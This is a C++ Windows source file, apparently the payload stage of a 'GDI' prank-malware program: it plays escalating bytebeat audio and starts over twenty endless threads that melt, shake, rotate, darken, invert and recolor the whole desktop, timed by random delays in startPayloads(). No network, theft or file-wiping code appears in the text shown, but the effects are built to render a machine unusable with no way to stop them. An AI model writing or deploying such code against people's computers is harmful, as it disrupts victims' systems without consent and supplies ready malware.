#include "stuff.h"

DWORD random() {
	DWORD number = __rdtsc();
	
	number ^= number << 13;
	number ^= number << 17;
	number ^= number << 5;

	return number;
}

void WINAPI Reset() {
	waveOutReset(wave);
	wave = 0;
}

void WINAPI Bytebeat1() {
	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };

	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
	char buffer[8000 * 60];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = (t * (t << 2 | t >> 7));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutWrite(wave, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void WINAPI Bytebeat2() {
	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };

	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
	char buffer[8000 * 60];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = (t * (t >> 2 | t >> 7));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutWrite(wave, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void WINAPI Bytebeat3() {
	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };

	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
	char buffer[8000 * 80];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = (t * (t >> 7));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutWrite(wave, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void WINAPI Bytebeat4() {
	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };

	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
	char buffer[8000 * 60];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = (t * ((t >> t | t >> 10) * 10 & 30));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutWrite(wave, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutClose(wave);
}

void WINAPI Bytebeat5() {
	WAVEFORMATEX wavef = { WAVE_FORMAT_PCM, 1, 8000, 0, WAVE_FORMAT_PCM, 8, 0 };

	waveOutOpen(&wave, 0, &wavef, 0, 0, 0);
	char buffer[8000 * 60];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = (t * ((t >> 6 | t >> 13) & 50));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };

	waveOutPrepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutWrite(wave, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(wave, &header, sizeof(WAVEHDR));
	waveOutClose(wave);
}

DWORD WINAPI Dark(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		for (int ys = 0; ys < y; ys += 6) {
			StretchBlt(hdc, 0, 0, x, ys, hdc, 0, 0, 1, 1, SRCAND);
			Sleep(1);
		}
	}
}

DWORD WINAPI Cursors(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);
	CURSORINFO cur;

	while (true) {
		int xs = 0;
		int ys = 0;
		int sel = random() % 4 + 1;

		if (sel == 1) {
			xs = random() % x;

			for (; ys < y; ys += 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs += 2;
				if (xs >= x) {
					ys = y;
				}
				Sleep(1);
			}
		}
		else if (sel == 2) {
			xs = random() % x;
			ys = GetSystemMetrics(SM_CYSCREEN);

			for (; ys > 0; ys -= 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs += 2;
				if (xs >= x) {
					ys = 0;
				}
				Sleep(1);
			}
		}
		else if (sel == 3) {
			xs = random() % x;

			for (; ys < y; ys += 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs -= 2;
				if (xs <= 0) {
					ys = y;
				}
				Sleep(1);
			}
		}
		else if (sel == 4) {
			xs = random() % x;
			ys = GetSystemMetrics(SM_CYSCREEN);

			for (; ys > 0; ys -= 2) {
				cur.cbSize = sizeof(cur);
				GetCursorInfo(&cur);

				DrawIcon(hdc, xs, ys, cur.hCursor);
				xs -= 2;
				if (xs <= 0) {
					ys = 0;
				}
				Sleep(1);
			}
		}
	}
}


DWORD WINAPI RGBCircle(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	int xs = random() % x;
	int ys = random() % y;

	HBRUSH circle = CreateSolidBrush(RGB(255, 0, 0));
	HPEN border = CreatePen(0, 1, RGB(255, 255, 255));

	int color = 0;

	while (true) {
		if (color == 1) {
			circle = CreateSolidBrush(RGB(255, 165, 0));
		}
		else if (color == 2) {
			circle = CreateSolidBrush(RGB(255, 255, 0));
		}
		else if (color == 3) {
			circle = CreateSolidBrush(RGB(0, 255, 0));
		}
		else if (color == 4) {
			circle = CreateSolidBrush(RGB(0, 255, 255));
		}
		else if (color == 5) {
			circle = CreateSolidBrush(RGB(0, 0, 255));
		}
		else if (color == 6) {
			circle = CreateSolidBrush(RGB(148, 0, 211));
		}
		else if (color == 7) {
			circle = CreateSolidBrush(RGB(255, 0, 255));
		}
		else if (color == 8) {
			circle = CreateSolidBrush(RGB(255, 0, 0));
			color = 0;
		}

		SelectObject(hdc, circle);
		SelectObject(hdc, border);
		
		if (xs >= x) {
			xs = random() % x;
			ys = random() % y;
		}
		else if (ys >= y) {
			xs = random() % x;
			ys = random() % y;
		}
		else if (xs <= 0) {
			xs = random() % x;
			ys = random() % y;
		}
		else if (ys <= 0) {
			xs = random() % x;
			ys = random() % y;
		}

		int sel = random() % 4 + 1;

		for (int runtime = 0; runtime < 10; runtime++) {
			if (sel == 1) {
				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
				xs += 20;
				ys += 20;
				Sleep(130);
			}
			else if (sel == 2) {
				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
				xs += 20;
				ys -= 20;
				Sleep(130);
			}
			else if (sel == 3) {
				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
				xs -= 20;
				ys += 20;
				Sleep(130);
			}
			else if (sel == 4) {
				Ellipse(hdc, xs - 60, ys - 60, xs + 60, ys + 60);
				xs -= 20;
				ys -= 20;
				Sleep(130);
			}
		}
		color++;
	}
}

DWORD WINAPI IconWave(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	double i;
	double wave;
	int xs;
	int ys;

	while (true) {
		int sel = random() % 4 + 1;
		wave = 0;
		i = 0;

		if (sel == 1) {
			xs = 0;
			ys = random() % y;

			for (; xs < x; xs += 3) {
				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_ERROR));
				i += 0.05;
				wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 2) {
			xs = x;
			ys = random() % y;

			for (; xs > 0; xs -= 3) {
				DrawIcon(hdc, xs, ys + wave * cos(i), LoadIconW(0, IDI_WARNING));
				i += 0.05;
				wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 3) {
			xs = random() % x;
			ys = 0;

			for (; ys < y; ys += 3) {
				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_INFORMATION));
				i += 0.05;
				wave += 0.32;
				Sleep(10);
			}
		}
		else if (sel == 4) {
			xs = random() % x;
			ys = y;

			for (; ys > 0; ys -= 3) {
				DrawIcon(hdc, xs + wave * cos(i), ys, LoadIconW(0, IDI_QUESTION));
				i += 0.05;
				wave += 0.32;
				Sleep(10);
			}
		}
	}
}

DWORD WINAPI Sinewave(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	double i = 0;

	while (true) {
		for (int ys = 0; ys < y; ys++) {
			BitBlt(hdc, 8 * sin(i), ys, x, 1, hdc, 0, ys, SRCCOPY);
			i += 0.04;
		}
		Sleep(40);
	}
}

DWORD WINAPI Shake(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, 10, 10, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(50);
		BitBlt(hdc, -10, 10, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(50);
		BitBlt(hdc, 10, -10, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(50);
		BitBlt(hdc, -10, -10, x, y, hdc, 0, 0, SRCCOPY);
		Sleep(50);
	}
}

DWORD WINAPI Dark2(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, random() % 2, random() % 2, x, y, hdc, random() % 2, random() % 2, SRCAND);
		Sleep(130);
	}
}

DWORD WINAPI Melter(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		int ys = random() % y;
		int sel = random() % 4 + 1;
		int size = random() % 300 + 200;
		int rnd = random() % 50 + 20;

		if (sel == 1) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs + i, ys + i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 2) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs + i, ys - i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 3) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs - i, ys + i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
		else if (sel == 4) {
			for (int i = 0; i < rnd; i += 10) {
				BitBlt(hdc, xs - i, ys - i, size, size, hdc, xs, ys, SRCCOPY);
				Sleep(100);
			}
		}
	}
}

DWORD WINAPI Trails(LPVOID lpstart) {
	HDC hdc = GetDC(0);
	POINT curpos;
	CURSORINFO cur;

	while (true) {
		GetCursorPos(&curpos);
		cur.cbSize = sizeof(cur);
		GetCursorInfo(&cur);

		DrawIcon(hdc, curpos.x, curpos.y, cur.hCursor);
		Sleep(10);
	}
}


DWORD WINAPI Melter2(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, random() % 2, random() % 2, random() % x, random() % y, hdc, random() % 2, random() % 2, SRCCOPY);
	}
}


DWORD WINAPI Rotate(LPVOID lpstart) {
	HDC hdc = GetDC(0);
	RECT rekt;
	POINT rotate[3];

	while (true) {
		int rnd = random() % 65 + 60;

		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left + i;
			rotate[0].y = rekt.top - i;
			rotate[1].x = rekt.right + i;
			rotate[1].y = rekt.top + i;
			rotate[2].x = rekt.left - i;
			rotate[2].y = rekt.bottom - i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(40);
		}
		for (int i = 0; i < rnd; i += 20) {
			GetWindowRect(GetDesktopWindow(), &rekt);

			rotate[0].x = rekt.left - i;
			rotate[0].y = rekt.top + i;
			rotate[1].x = rekt.right - i;
			rotate[1].y = rekt.top - i;
			rotate[2].x = rekt.left + i;
			rotate[2].y = rekt.bottom + i;

			PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			Sleep(40);
		}
	}
}

DWORD WINAPI Rainbow(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(random() % 255, random() % 255, random() % 255));
		SelectObject(hdc, brush);

		PatBlt(hdc, 0, 0, x, y, PATINVERT);
		Sleep(random() % 200 + 130);
	}
}


DWORD WINAPI Melter3(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int ys = random() % y;
		int size = random() % 80 + 50;

		if (random() % 2 + 1 == 1) {
			for (int i = 0; i < 5; i++) {
				BitBlt(hdc, i, ys, x, size, hdc, 0, ys, SRCCOPY);
			}
		}
		else {
			for (int i = 0; i < 5; i++) {
				BitBlt(hdc, -i, ys, x, size, hdc, 0, ys, SRCCOPY);
			}
		}
	}
}

DWORD WINAPI Colors(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int color = (random() % 2) ? 0x666666 : 0x999999;

		BitBlt(hdc, 1, 1, x, y, hdc, 0, 0, color);
		Sleep(40);
		BitBlt(hdc, -1, 1, x, y, hdc, 0, 0, color);
		Sleep(40);
		BitBlt(hdc, 1, -1, x, y, hdc, 0, 0, color);
		Sleep(40);
		BitBlt(hdc, -1, -1, x, y, hdc, 0, 0, color);
		Sleep(40);
	}
}

DWORD WINAPI Flip(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		StretchBlt(hdc, 0, 0, x, y, hdc, x, 0, -x, y, SRCCOPY);
		Sleep(100);
		StretchBlt(hdc, 0, 0, x, y, hdc, 0, y, x, -y, SRCCOPY);
		Sleep(100);
	}
}

DWORD WINAPI CircleSquare(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		int ys = random() % y;

		int rnd = random() % 600 + 500;

		if (random() % 2 + 1 == 1) {
			for (int i = 0; i < rnd; i += 30) {
				HRGN circle = CreateEllipticRgn(xs - i, ys - i, xs + i, ys + i);
				SelectClipRgn(hdc, circle);

				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
				Sleep(1);
			}
		}
		else {
			for (int i = 0; i < rnd; i += 30) {
				HRGN square = CreateRectRgn(xs - i, ys - i, xs + i, ys + i);
				SelectClipRgn(hdc, square);

				BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
				Sleep(1);
			}
		}
		Sleep(1);
	}
}

DWORD WINAPI Bright(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		int xs = random() % x;
		BitBlt(hdc, xs, 0, 100, y, hdc, xs, random() % 14 + -5, SRCPAINT);
	}
}

DWORD WINAPI ExtremeRotation(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	RECT rekt;
	POINT rotate[3];

	while (true) {
		if (random() % 2 + 1 == 1) {
			for (int runtime = 0; runtime < 30; runtime++) {
				GetWindowRect(GetDesktopWindow(), &rekt);

				rotate[0].x = rekt.left + 90;
				rotate[0].y = rekt.top - 90;
				rotate[1].x = rekt.right + 90;
				rotate[1].y = rekt.top + 90;
				rotate[2].x = rekt.left - 90;
				rotate[2].y = rekt.bottom - 90;

				PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			}
		}
		else {
			for (int runtime = 0; runtime < 30; runtime++) {
				GetWindowRect(GetDesktopWindow(), &rekt);

				rotate[0].x = rekt.left - 90;
				rotate[0].y = rekt.top + 90;
				rotate[1].x = rekt.right - 90;
				rotate[1].y = rekt.top - 90;
				rotate[2].x = rekt.left + 90;
				rotate[2].y = rekt.bottom + 90;

				PlgBlt(hdc, rotate, hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
			}
		}
	}
}

DWORD WINAPI Cubes(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	int ys = 0;

	while (true) {
		HBRUSH brush = CreateSolidBrush(RGB(random() % 255, random() % 255, random() % 255));
		SelectObject(hdc, brush);

		for (int i = 0; i < x; i += 100) {
			Rectangle(hdc, i, ys + 100, 100 + i, ys);
			Sleep(10);
		}

		ys += 100;
		if (ys >= y) {
			ys = 0;
		}

		Sleep(30);
	}
}

DWORD WINAPI Invert(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	HDC hdc = GetDC(0);

	while (true) {
		BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, NOTSRCCOPY);
	}
}

void startPayloads() {
	HANDLE thread;
	DWORD ID;

	Sleep(random() % 5000 + 3400);
	HANDLE dark = CreateThread(0, 0, Dark, 0, 0, &ID);

	Sleep(random() % 4800 + 3900);
	thread = CreateThread(0, 0, Cursors, 0, 0, &ID);
	Bytebeat1();

	Sleep(random() % 15000 + 11000);

	Sleep(random() % 12000 + 10000);

	thread = CreateThread(0, 0, Melter, 0, 0, &ID);
	thread = CreateThread(0, 0, Trails, 0, 0, &ID);
	thread = CreateThread(0, 0, RGBCircle, 0, 0, &ID);
	thread = CreateThread(0, 0, IconWave, 0, 0, &ID);
	Reset();
	Bytebeat2();
	TerminateThread(dark, 0);
	CloseHandle(dark);

	Sleep(random() % 14000 + 13000);
	thread = CreateThread(0, 0, Sinewave, 0, 0, &ID);

	Sleep(random() % 10000 + 9000);
	thread = CreateThread(0, 0, Shake, 0, 0, &ID);

	Sleep(random() % 8000 + 7000);
	thread = CreateThread(0, 0, Rotate, 0, 0, &ID);
	thread = CreateThread(0, 0, Melter2, 0, 0, &ID);
	Reset();
	Bytebeat3();

	Sleep(random() % 10000 + 9000);
	thread = CreateThread(0, 0, Dark2, 0, 0, &ID);

	Sleep(random() % 4500 + 3200);
	thread = CreateThread(0, 0, Cubes, 0, 0, &ID);
	
	Sleep(random() % 24000 + 21000);
	thread = CreateThread(0, 0, Rainbow, 0, 0, &ID);

	Sleep(random() % 4000 + 2700);
	thread = CreateThread(0, 0, Flip, 0, 0, &ID);

	Sleep(random() % 7500 + 6400);
	thread = CreateThread(0, 0, Melter3, 0, 0, &ID);
	thread = CreateThread(0, 0, Colors, 0, 0, &ID);
	thread = CreateThread(0, 0, CircleSquare, 0, 0, &ID);
	Reset();
	Bytebeat4();

	Sleep(random() % 20000 + 18000);
	thread = CreateThread(0, 0, Bright, 0, 0, &ID);
	thread = CreateThread(0, 0, ExtremeRotation, 0, 0, &ID);
	Reset();
	Bytebeat5();

	Sleep(random() % 17000 + 16000);
	thread = CreateThread(0, 0, Invert, 0, 0, &ID);

	CloseHandle(thread);

	Sleep(random() % 4000 + 3000);
}
